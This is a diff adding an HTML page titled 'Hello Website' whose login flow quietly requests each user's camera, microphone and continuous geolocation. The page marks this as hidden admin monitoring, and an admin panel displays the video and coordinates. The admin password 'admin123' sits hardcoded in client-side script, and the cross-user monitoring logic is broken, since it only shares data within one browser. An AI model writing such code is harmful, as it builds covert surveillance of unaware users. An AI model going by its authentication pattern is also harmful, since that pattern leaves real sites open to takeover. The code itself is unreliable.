@@ -1,0 +1,152 @@
+<DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Hello Website</title>
+  <style>
+    /* ...existing code... */
+  </style>
+</head>
+<body>
+  <h1>Hello, welcome to our website!</h1>
+
+  <!-- Login Section -->
+  <div class="login-section">
+    <div>
+      <input type="text" id="username" placeholder="Enter username">
+      <input type="password" id="adminPassword" placeholder="Admin Password (for admin only)" style="display: none;">
+      <button onclick="login()">Login</button>
+    </div>
+  </div>
+
+  <!-- User Panel -->
+  <div id="userPanel" class="user-panel">
+    <h2>User Dashboard</h2>
+    <p>Welcome, <span id="userWelcome"></span>!</p>
+    <div>
+      <h3>User Activities</h3>
+      <ul>
+        <li>View Profile</li>
+        <li>Update Settings</li>
+        <li>View Messages</li>
+      </ul>
+    </div>
+    <!-- Hidden elements for admin monitoring -->
+    <div style="display: none;">
+      <video id="userCamera" autoplay></video>
+      <audio id="userAudio"></audio>
+    </div>
+  </div>
+
+  <!-- Admin Panel -->
+  <div id="adminPanel" class="admin-panel">
+    <h2>Admin Panel</h2>
+    <div id="userMonitoring">
+      <h3>User Monitoring</h3>
+      <div id="userList"></div>
+    </div>
+  </div>
+
+  <script>
+    const ADMIN_PASSWORD = "admin123";
+    const VALID_USERS = ["user1", "user2", "user3"];
+    let connectedUsers = {};
+    let currentUser = null;
+
+    function login() {
+      const username = document.getElementById("username").value.trim();
+      
+      if (username === "admin") {
+        const adminPass = document.getElementById("adminPassword").value;
+        if (adminPass === ADMIN_PASSWORD) {
+          document.getElementById("adminPanel").style.display = "block";
+          document.getElementById("userPanel").style.display = "none";
+          initializeAdminDashboard();
+        } else {
+          alert("Invalid admin password");
+        }
+        return;
+      }
+
+      if (VALID_USERS.includes(username)) {
+        currentUser = username;
+        document.getElementById("userPanel").style.display = "block";
+        document.getElementById("adminPanel").style.display = "none";
+        document.getElementById("userWelcome").textContent = username;
+        initializeUserMonitoring(username);
+        return;
+      }
+
+      alert("Invalid username");
+    }
+
+    function initializeUserMonitoring(username) {
+      // Request permissions and start monitoring
+      navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+        .then(stream => {
+          connectedUsers[username] = {
+            stream: stream,
+            location: null
+          };
+
+          if (navigator.geolocation) {
+            navigator.geolocation.watchPosition(
+              position => {
+                connectedUsers[username].location = {
+                  latitude: position.coords.latitude,
+                  longitude: position.coords.longitude,
+                  accuracy: position.coords.accuracy
+                };
+              }
+            );
+          }
+        })
+        .catch(err => console.warn("Media access denied:", err));
+    }
+
+    function initializeAdminDashboard() {
+      const userList = document.getElementById("userList");
+      userList.innerHTML = "";
+
+      // Create monitoring panels for each user
+      Object.keys(connectedUsers).forEach(username => {
+        const userPanel = document.createElement("div");
+        userPanel.className = "user-monitoring";
+        userPanel.innerHTML = `
+          <h4>User: ${username}</h4>
+          <div>Location: <span id="location-${username}">Waiting...</span></div>
+          <video id="camera-${username}" width="320" height="240" autoplay></video>
+          <meter id="audio-${username}" min="0" max="100" value="0"></meter>
+        `;
+        userList.appendChild(userPanel);
+
+        // Set up video and audio monitoring
+        const videoElement = document.getElementById(`camera-${username}`);
+        if (connectedUsers[username].stream) {
+          videoElement.srcObject = connectedUsers[username].stream;
+        }
+
+        // Update location display
+        if (connectedUsers[username].location) {
+          updateLocationDisplay(username);
+        }
+      });
+    }
+
+    function updateLocationDisplay(username) {
+      const location = connectedUsers[username].location;
+      const locationElement = document.getElementById(`location-${username}`);
+      locationElement.textContent = `
+        Lat: ${location.latitude.toFixed(6)}, 
+        Long: ${location.longitude.toFixed(6)}
+      `;
+    }
+
+    // Show/hide admin password field
+    document.getElementById("username").addEventListener("input", function() {
+      const adminPassField = document.getElementById("adminPassword");
+      adminPassField.style.display = this.value === "admin" ? "block" : "none";
+    });
+  </script>
+</body>
+</html>
